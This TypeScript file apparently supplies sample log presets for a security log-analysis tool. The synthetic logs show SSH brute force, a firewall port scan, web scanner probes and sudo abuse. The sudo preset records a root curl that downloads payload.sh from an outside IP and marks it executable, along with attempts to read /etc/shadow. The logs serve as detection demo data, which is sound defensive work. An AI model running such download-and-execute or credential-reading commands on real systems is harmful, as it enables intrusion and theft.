import { SampleLogPreset } from '../types/security';

export const SAMPLE_LOGS: SampleLogPreset[] = [
  {
    id: 'ssh-bruteforce',
    name: 'SSH Brute-Force & Credential Stuffing',
    category: '/var/log/auth.log',
    badge: 'High Criticality',
    description: 'High-frequency password spray targeting root, admin, and deploy users across multiple external IPs.',
    content: `Oct 22 04:12:01 server-prod-01 sshd[14201]: Invalid user admin from 185.220.101.5 port 42812
Oct 22 04:12:02 server-prod-01 sshd[14201]: Failed password for invalid user admin from 185.220.101.5 port 42812 ssh2
Oct 22 04:12:03 server-prod-01 sshd[14205]: Invalid user root from 185.220.101.5 port 42818
Oct 22 04:12:04 server-prod-01 sshd[14205]: Failed password for root from 185.220.101.5 port 42818 ssh2
Oct 22 04:12:05 server-prod-01 sshd[14209]: Invalid user deploy from 185.220.101.5 port 42822
Oct 22 04:12:06 server-prod-01 sshd[14209]: Failed password for invalid user deploy from 185.220.101.5 port 42822 ssh2
Oct 22 04:12:08 server-prod-01 sshd[14214]: Failed password for invalid user postgres from 185.220.101.5 port 42830 ssh2
Oct 22 04:12:10 server-prod-01 sshd[14218]: Failed password for invalid user oracle from 185.220.101.5 port 42834 ssh2
Oct 22 04:12:12 server-prod-01 sshd[14222]: Failed password for invalid user test from 185.220.101.5 port 42840 ssh2
Oct 22 04:12:15 server-prod-01 sshd[14227]: Connection closed by authenticating user root 185.220.101.5 port 42846 [preauth]
Oct 22 04:13:30 server-prod-01 sshd[14310]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=ubuntu
Oct 22 04:13:32 server-prod-01 sshd[14310]: Failed password for ubuntu from 45.33.32.156 port 51234 ssh2
Oct 22 04:13:34 server-prod-01 sshd[14315]: Failed password for ubuntu from 45.33.32.156 port 51238 ssh2
Oct 22 04:13:36 server-prod-01 sshd[14320]: Failed password for ubuntu from 45.33.32.156 port 51242 ssh2
Oct 22 04:13:38 server-prod-01 sshd[14325]: Failed password for ubuntu from 45.33.32.156 port 51246 ssh2
Oct 22 04:13:40 server-prod-01 sshd[14328]: error: maximum authentication attempts exceeded for ubuntu from 45.33.32.156 port 51250 ssh2 [preauth]
Oct 22 04:15:10 server-prod-01 sshd[14450]: Received disconnect from 194.26.29.112 port 38920:11: Bye Bye [preauth]
Oct 22 04:15:12 server-prod-01 sshd[14452]: Invalid user guest from 194.26.29.112 port 38924
Oct 22 04:15:13 server-prod-01 sshd[14452]: Failed password for invalid user guest from 194.26.29.112 port 38924 ssh2
Oct 22 04:15:15 server-prod-01 sshd[14456]: Failed password for invalid user git from 194.26.29.112 port 38928 ssh2`,
  },
  {
    id: 'ufw-portscan',
    name: 'UFW Firewall Port Scan & SYN Flood',
    category: '/var/log/ufw.log',
    badge: 'Reconnaissance Probe',
    description: 'Kernel firewall audit trail showing coordinated SYN port scan against Redis, Database, Telnet, and RDP ports.',
    content: `Oct 22 05:01:14 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54321 PROTO=TCP SPT=49152 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:14 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54322 PROTO=TCP SPT=49153 DPT=23 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:15 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54323 PROTO=TCP SPT=49154 DPT=80 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:15 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54324 PROTO=TCP SPT=49155 DPT=443 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:15 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54325 PROTO=TCP SPT=49156 DPT=3389 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:16 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54326 PROTO=TCP SPT=49157 DPT=6379 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:16 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54327 PROTO=TCP SPT=49158 DPT=5432 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:17 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54328 PROTO=TCP SPT=49159 DPT=27017 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:18 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54329 PROTO=TCP SPT=49160 DPT=8080 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:01:19 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=198.51.100.88 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=54330 PROTO=TCP SPT=49161 DPT=9200 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 22 05:02:40 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=103.145.13.4 DST=192.168.1.10 LEN=48 TOS=0x00 PREC=0x00 TTL=114 ID=18944 PROTO=TCP SPT=61245 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
Oct 22 05:02:41 node-gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=103.145.13.4 DST=192.168.1.10 LEN=48 TOS=0x00 PREC=0x00 TTL=114 ID=18945 PROTO=TCP SPT=61246 DPT=2222 WINDOW=65535 RES=0x00 SYN URGP=0`,
  },
  {
    id: 'sudo-privesc',
    name: 'Sudo Abuse & Privilege Escalation',
    category: '/var/log/auth.log',
    badge: 'Internal Threat',
    description: 'Suspicious user session trying unauthorized sudo commands and attempting su to root.',
    content: `Oct 22 02:45:10 ubuntu-app-server sudo: pam_unix(sudo:auth): authentication failure; logname=www-data uid=33 euid=0 tty= ruser=www-data rhost= user=www-data
Oct 22 02:45:12 ubuntu-app-server sudo: www-data : 3 incorrect password attempts ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
Oct 22 02:45:20 ubuntu-app-server sudo: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Oct 22 02:45:25 ubuntu-app-server sudo: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/crontab -l
Oct 22 02:46:01 ubuntu-app-server su[18902]: pam_unix(su:auth): authentication failure; logname=www-data uid=33 euid=0 tty=pts/2 ruser=www-data rhost= user=root
Oct 22 02:46:04 ubuntu-app-server su[18902]: FAILED SU (to root) www-data on pts/2
Oct 22 02:47:11 ubuntu-app-server sshd[19102]: Accepted publickey for backup-user from 192.168.1.200 port 54820 ssh2: RSA SHA256:abcd1234
Oct 22 02:47:30 ubuntu-app-server sudo: backup-user : TTY=pts/3 ; PWD=/home/backup-user ; USER=root ; COMMAND=/usr/bin/curl http://185.190.140.2/payload.sh -o /tmp/run.sh
Oct 22 02:47:35 ubuntu-app-server sudo: backup-user : TTY=pts/3 ; PWD=/home/backup-user ; USER=root ; COMMAND=/bin/chmod +x /tmp/run.sh`,
  },
  {
    id: 'web-and-ssh',
    name: 'Web Exploitation Probe & Lateral SSH',
    category: 'syslog & nginx',
    badge: 'Multi-Vector',
    description: 'Automated vulnerability scanner seeking wp-login, .env files, and phpmyadmin, correlating with SSH connection flood.',
    content: `Oct 22 06:10:01 web01 nginx[3102]: 193.105.181.66 - - [22/Oct/2026:06:10:01 +0000] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.68.0"
Oct 22 06:10:02 web01 nginx[3102]: 193.105.181.66 - - [22/Oct/2026:06:10:02 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 162 "-" "Mozilla/5.0"
Oct 22 06:10:03 web01 nginx[3102]: 193.105.181.66 - - [22/Oct/2026:06:10:03 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 162 "-" "Mozilla/5.0"
Oct 22 06:10:05 web01 nginx[3102]: 193.105.181.66 - - [22/Oct/2026:06:10:05 +0000] "POST /api/v1/debug HTTP/1.1" 403 148 "-" "python-requests/2.28.1"
Oct 22 06:10:15 web01 sshd[3180]: Invalid user support from 193.105.181.66 port 58912
Oct 22 06:10:16 web01 sshd[3180]: Failed password for invalid user support from 193.105.181.66 port 58912 ssh2
Oct 22 06:10:18 web01 sshd[3184]: Failed password for invalid user operator from 193.105.181.66 port 58916 ssh2
Oct 22 06:10:20 web01 sshd[3188]: Failed password for invalid user nagios from 193.105.181.66 port 58920 ssh2
Oct 22 06:10:22 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:33:54:fe:00:00:00:01:00:08:00 SRC=193.105.181.66 DST=10.0.0.5 LEN=60 PROTO=TCP SPT=58924 DPT=8080 SYN`,
  },
];
